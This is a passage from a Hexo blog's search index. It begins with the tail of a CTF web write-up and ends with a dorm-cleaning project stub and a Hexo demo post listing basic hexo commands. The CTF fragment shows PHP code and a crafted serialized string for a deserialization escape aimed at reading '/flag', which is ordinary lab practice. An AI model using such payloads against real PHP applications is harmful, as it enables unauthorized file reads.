class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">escape</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$phone</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$email</span> = <span class="hljs-string">&#x27;/flag&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">escape</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br> <br><span class="hljs-comment">//O:6:&quot;escape&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:5:&quot;phone&quot;;a:1:&#123;i:0;i:1;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;</span><br><span class="hljs-comment">//&quot;;s:5:&quot;phone&quot;;a:1:&#123;i:0;i:1;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>寝室打扫卫生查人系统</title>
    <link href="/2023/04/27/CleanRoomProject/"/>
    <url>/2023/04/27/CleanRoomProject/</url>
    
    <content type="html"><![CDATA[<h1 id="寝室打扫卫生查人系统"><a href="#寝室打扫卫生查人系统" class="headerlink" title="寝室打扫卫生查人系统"></a>寝室打扫卫生查人系统</h1><h2 id="本系统包含一个弹出式窗口，请查看弹出式窗口。"><a href="#本系统包含一个弹出式窗口，请查看弹出式窗口。" class="headerlink" title="本系统包含一个弹出式窗口，请查看弹出式窗口。"></a>本系统包含一个弹出式窗口，请查看弹出式窗口。</h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hexo演示文稿</title>
    <link href="/2023/04/14/HexoDemo/"/>
    <url>/2023/04/14/HexoDemo/</url>
    
    <content type="html"><![CDATA[<h1 id="Hexo演示文稿"><a href="#Hexo演示文稿" class="headerlink" title="Hexo演示文稿"></a>Hexo演示文稿</h1><h2 id="一、本文稿用于测试和学习Hexo的相关知识"><a href="#一、本文稿用于测试和学习Hexo的相关知识" class="headerlink" title="一、本文稿用于测试和学习Hexo的相关知识"></a>一、本文稿用于测试和学习Hexo的相关知识</h2><p>​为了更好的学习Hexo相关的内容，我们创建了此文稿并实现一些功能。为之后的Hexo文档编写做好准备。</p><h2 id="二、代码行演示（常用的Hexo命令）"><a href="#二、代码行演示（常用的Hexo命令）" class="headerlink" title="二、代码行演示（常用的Hexo命令）"></a>二、代码行演示（常用的Hexo命令）</h2><h3 id="1、清除之前生成的代码（先cd进入博客目录）"><a href="#1、清除之前生成的代码（先cd进入博客目录）" class="headerlink" title="1、清除之前生成的代码（先cd进入博客目录）"></a>1、清除之前生成的代码（先cd进入博客目录）</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo clean</span><br></code></pre></td></tr></table></figure><h3 id="2、生成新的网站"><a href="#2、生成新的网站" class="headerlink" title="2、生成新的网站"></a>2、生成新的网站</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo g</span><br></code></pre></td></tr></table></figure><h3 id="3-1、启动本地端口"><a href="#3-1、启动本地端口" class="headerlink" title="3-1、启动本地端口"></a>3-1、启动本地端口</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo s</span><br></code></pre></td></tr></table></figure><h3 id="3-2、上传到GitHub"><a href="#3-2、上传到GitHub" class="headerlink" title="3-2、上传到GitHub"></a>3-2、上传到GitHub</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo d</span><br></code></pre></td></tr></table></figure><p>相关配置文章：</p><p>1、<a href="https://hexo.io/zh-cn/docs/front-matter">https://hexo.io/zh-cn/docs/front-matter</a></p><p>2、<a href="https://hexo.fluid-dev.com/docs/guide/">https://hexo.fluid-dev.com/docs/guide/</a></p><p>3、<a href="https://zhuanlan.zhihu.com/p/547520780?utm_id=0">https://zhuanlan.zhihu.com/p/547520780?utm_id=0</a></p><h2 id="三、图片演示"><a href="#三、图片演示" class="headerlink" title="三、图片演示"></a>三、图片演示</h2><h3 id="1、来自于Hexo内部文件夹"><a href="#1、来自于Hexo内部文件夹" class="headerlink" title="1、来自于Hexo内部文件夹"></a>1、来自于Hexo内部文件夹</h3><p><img src="/img/testphoto.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Hexo</category>
      
      <category>Web</category>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
